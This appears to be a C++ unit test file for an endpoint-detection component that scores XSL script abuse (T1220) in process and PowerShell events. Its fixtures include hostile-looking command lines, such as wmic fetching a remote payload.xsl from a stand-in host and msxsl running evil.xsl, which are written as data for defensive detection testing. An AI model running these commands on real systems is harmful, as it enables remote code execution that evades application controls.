/*
 * xsl_script_detector_tests.cpp - Unit tests for XslScriptDetector
 * (T1220).
 */
#include "xsl_script_detector_tests.h"

#include <cstdint>
#include <cstdio>
#include <stdexcept>
#include <string>

#include "edr_event.h"
#include "event_bus.h"
#include "xsl_script_detector.h"

namespace {

#define XS_CHECK(condition) Check((condition), #condition, __LINE__)

void Check(bool condition, const char* expression, int line) {
    if (!condition)
        throw std::runtime_error(
            "xsl script detector test failed at line " +
            std::to_string(line) + ": " + expression);
}

edr::Event ProcEvent(uint64_t ts100ns, const char* image,
                     const char* commandLine) {
    edr::Event event;
    event.type = EDR_EVT_PROCESS_START;
    event.ts100ns = ts100ns;
    event.fields[edr::field::kType] = "PROCESS_START";
    event.fields[edr::field::kImage] = image;
    if (commandLine != nullptr)
        event.fields[edr::field::kCommandLine] = commandLine;
    return event;
}

edr::Event ScriptEvent(uint64_t ts100ns, const char* script) {
    edr::Event event;
    event.type = EDR_EVT_POWERSHELL_SCRIPT;
    event.ts100ns = ts100ns;
    event.fields[edr::field::kType] = "POWERSHELL_SCRIPT";
    event.fields[edr::field::kImage] =
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    event.fields[edr::field::kScriptBlockText] = script;
    return event;
}

std::string Score(const edr::Event& event) {
    auto it = event.fields.find(edr::field::kXslScriptScore);
    return it == event.fields.end() ? "" : it->second;
}

constexpr uint64_t kSecond = 10000000ULL;

} // namespace

void RunXslScriptDetectorTests() {
    std::fprintf(stderr, "[xsl-script] TestDisabled\n");
    {
        edr::XslScriptDetector detector(false, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1000 * kSecond, "C:\\Windows\\System32\\msxsl.exe",
            "msxsl.exe customers.xml evil.xsl");
        detector.Enrich(event);
        XS_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[xsl-script] TestMsxsl\n");
    {
        edr::XslScriptDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1001 * kSecond, "C:\\Windows\\System32\\msxsl.exe",
            "msxsl.exe customers.xml C:\\Users\\Public\\evil.xsl");
        detector.Enrich(event);
        XS_CHECK(Score(event) == "90");
        XS_CHECK(event.fields.at(edr::field::kXslScriptVerdict) ==
                 "malicious");
    }
    std::fprintf(stderr, "[xsl-script] TestWmicRemote\n");
    {
        edr::XslScriptDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1002 * kSecond, "C:\\Windows\\System32\\wbem\\wmic.exe",
            "wmic process list /format:https://evil.test/payload.xsl");
        detector.Enrich(event);
        XS_CHECK(Score(event) == "90");
    }
    std::fprintf(stderr, "[xsl-script] TestWmicUserWritable\n");
    {
        edr::XslScriptDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1003 * kSecond, "C:\\Windows\\System32\\wbem\\wmic.exe",
            "wmic os get /format:C:\\Users\\Public\\sheet.xsl");
        detector.Enrich(event);
        XS_CHECK(Score(event) == "85");
    }
    std::fprintf(stderr, "[xsl-script] TestTransformNodeScript\n");
    {
        edr::XslScriptDetector detector(true, 55, 300, 1024);
        edr::Event event = ScriptEvent(
            1004 * kSecond,
            "$xsl = New-Object System.Xml.Xsl.XslCompiledTransform; "
            "$xsl.Load('evil.xsl'); $xsl.Transform('in.xml','out')");
        detector.Enrich(event);
        XS_CHECK(Score(event) == "80");
    }
    std::fprintf(stderr, "[xsl-script] TestBuiltinFormatSilent\n");
    {
        edr::XslScriptDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1005 * kSecond, "C:\\Windows\\System32\\wbem\\wmic.exe",
            "wmic process list /format:list");
        detector.Enrich(event);
        XS_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[xsl-script] TestBareMsxslSilent\n");
    {
        edr::XslScriptDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1006 * kSecond, "C:\\Windows\\System32\\msxsl.exe",
            "msxsl.exe /?");
        detector.Enrich(event);
        XS_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[xsl-script] TestEmptyPsScriptSilent\n");
    {
        edr::XslScriptDetector detector(true, 55, 300, 1024);
        edr::Event event = ScriptEvent(1007 * kSecond, "");
        detector.Enrich(event);
        XS_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[xsl-script] all passed\n");
}
